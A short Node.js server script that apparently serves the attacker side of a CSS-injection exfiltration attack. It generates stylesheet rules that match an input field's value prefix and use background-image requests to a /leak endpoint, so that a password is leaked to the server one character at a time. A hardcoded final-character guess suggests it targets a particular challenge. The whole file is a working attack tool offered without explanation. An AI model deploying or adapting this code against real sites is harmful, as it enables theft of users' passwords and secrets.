const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
let extractedData = "";
let stop = false;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, true);
    if (stop) return response.end();

    switch (req.pathname) {
        case "/leak":
            if (req.query.char) {
                extractedData += req.query.char;
                console.log("Extracted data so far:", extractedData);
                if (extractedData.length >= 10) { // Assuming password length is 10
                    stop = true;
                    console.log("Extraction complete:", extractedData);
                }
            }
            response.end();
            break;
        case "/style.css":
            let css = '';
            const possibleChars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            for (let i = 0; i < possibleChars.length; i++) {
                const char = possibleChars[i];
                css += `input[value^="${extractedData + char}"] { background-image: url(${HOSTNAME}/leak?char=${char}); }\n`;
            }
            if (extractedData.length >= 9) { // Ensure we try to catch the last character
                css += `input[value="${extractedData}t"] { background-image: url(${HOSTNAME}/leak?char=t); }\n`;
            }
            response.writeHead(200, { 'Content-Type': 'text/css' });
            response.write(css);
            response.end();
            break;
        default:
            response.end();
    }
}

const server = http.createServer(requestHandler);

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
});
